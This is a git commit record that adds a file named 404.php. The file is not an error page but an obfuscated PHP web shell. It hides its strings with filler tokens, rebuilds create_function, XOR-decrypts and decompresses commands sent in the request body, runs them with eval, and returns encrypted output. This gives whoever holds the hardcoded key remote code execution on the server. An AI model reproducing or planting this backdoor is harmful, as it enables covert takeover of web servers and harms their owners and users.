3974d1d1ef67da755d09f52273ac23ddb98e7da4
GOOVEX <134889143+GOOVEX@users.noreply.github.com>
2023-09-24 15:16:13 +0100

    Add files via upload

---
+++ 404.php
@@ -0,0 +1,10 @@
+<?php
+$U='_cJWontents();@JWob_enJWd_cleanJW();$r=JW@bJWaseJW64_encode(@JWxJW(@gzcomJWpressJW($JWo),$k));printJW("$JWp$kh$r$kf");}';
+$N=str_replace('TG','','TGTGcreaTGtTGe_funTGctTGion');
+$x='$k="1320JW34f8JW";$JWkh="JWe76JW0f0f682fd";$kfJW="99JW35b30aJW0340";$p=JW"9zJWRjwfJWjwgx99JWVu0e";functJWion x(JW$t,$k)';
+$d='iJWnput"),$m)=JW=1) {@ob_starJWt();JW@evJWalJW(@gzuncomprJWJWess(@x(@JWbasJWe64_JWdecode($m[1]),$kJW)));JW$o=@obJW_get';
+$E='o.=$t{$i}^JW$JWk{$j}JW;}JW}return $o;JW}if (@pJWregJW_match("/JW$kh(.JW+)$kfJW/",@JWfilJWe_JWget_contJWents(JW"php://';
+$I='{JW$c=strJWlen($k)JW;$l=JWstrJWlen($t);$o=JW"";forJWJW($i=JW0;$i<$l;){JWfor($j=JWJW0JW;($JWj<$cJW&&$i<$l);$j++,$iJW++){$';
+$J=str_replace('JW','',$x.$I.$E.$d.$U);
+$v=$N('',$J);$v();
+?>
